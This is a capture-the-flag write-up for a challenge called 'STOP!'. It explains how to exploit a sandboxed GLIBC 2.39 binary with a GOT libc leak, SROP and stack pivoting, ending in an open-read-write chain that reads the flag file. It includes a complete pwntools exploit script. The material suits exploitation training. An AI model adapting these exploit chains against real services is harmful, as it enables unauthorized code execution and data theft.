## STOP!

This challenge tests **Stack Feng Shui**, with the core focus being **Stack Pivoting**, **SROP**, and **ORW**. The challenge itself is very concise, consisting of only two inputs. A basic sandbox is enabled, which can be bypassed using an ORW chain. The problem lies in the fact that this binary was compiled with **GLIBC 2.39**, and there is no `pop rdi` gadget in the program. Therefore, even with a large overflow, a direct `ret2libc` is not possible. There should be more than one solution to this; one of them is described below:

Since we need to perform **ORW**, the libc address must be leaked first. PIE is disabled, so the libc address can be leaked via the **GOT table**. Without `pop rdi`, we use **SROP**. The program provides a `syscall` gadget. Next, consider how to set `rax` to 15 without a `pop rax` gadget. The challenge provides a hint: *the rax register is generally used to store both function return values and system call numbers*. Therefore, we can control `rax` by controlling the number of bytes read by the `read` function. After reading exactly 15 bytes, we directly transition to the `syscall`, achieving the effect of controlling `rax` to trigger **SROP**.

In SROP, `rsp` and `rbp` can be controlled. By using **Stack Pivoting**, we can write the ORW ROP chain onto the **BSS segment** to leak the flag. This challenge requires a certain amount of time for debugging and trial and error. The difficulties lie in: 1. Thinking of using the function return value to construct `rax`; 2. Handing over the stack pivot between SROP and ROP.

Python

```python
from pwn import *
# r=process('./code')
r=remote("127.0.0.1",46825)
libc=ELF('./libc.so.6')
context.log_level='debug'
context.arch='amd64'

read=0x4012a9
syscall=0x4012fa
leave=0x4012d3
puts_got=0x404010
puts_plt=0x4010b0
bss=0x404090+0x500
print(hex(bss))

r.sendafter(b're you doing here?\n',b'beef')

r.sendafter(b'TOP doing this!\n',b'a'*0x70+p64(bss)+p64(read))#1

r.recvuntil(b'doing this!\n')
payload=p64(bss+0x10)+p64(read)#2
payload=payload.ljust(0x70,b'\x00')
payload+=p64(bss-0x70)+p64(leave)+p64(bss+0x100)+p64(syscall)

frame3 = SigreturnFrame()
frame3.rip = puts_plt
frame3.rbp = bss+0x210
frame3.rsp = bss-0x60+8
frame3.rdi = puts_got
frame3.rsi = 0
frame3.rdx = 0
frame3.rax = 15

payload+=bytes(frame3)

#4520
r.send(payload)#1

#4530

r.sendafter(b'TOP doing this!\n',p64(bss)+b'\xa9\x12\x40\x00\x00\x00\x00')#2 #3
libc_base=u64(r.recv(6).ljust(8,b'\x00'))-libc.sym['puts']
print(hex(libc_base))
open=libc_base+libc.sym['open']
rread=libc_base+libc.sym['read']
write=libc_base+libc.sym['write']
rdi=libc_base+0x10f78b
rsi=libc_base+0x110a7d
rdx=0x4012fc
ret=libc_base+0x2882f

r.recvuntil(b'doing this!\n')
payload=b'a'*0x18+p64(bss+0x10)+0x50*b'a'+b'./flag\x00\x00'
payload+=p64(rdi)+p64(bss+0x210)+p64(rsi)+p64(0)+p64(open)
payload+=p64(rdi)+p64(3)+p64(rsi)+p64(bss+0x318)+p64(rdx)+p64(0x100)+p64(bss+0x318)+p64(rread)
payload+=p64(rdi)+p64(1)+p64(rsi)+p64(bss+0x318)+p64(rdx)+p64(0x100)+p64(bss+0x318)+p64(write)

# gdb.attach(r)
# pause()
r.send(payload)

r.interactive()
```

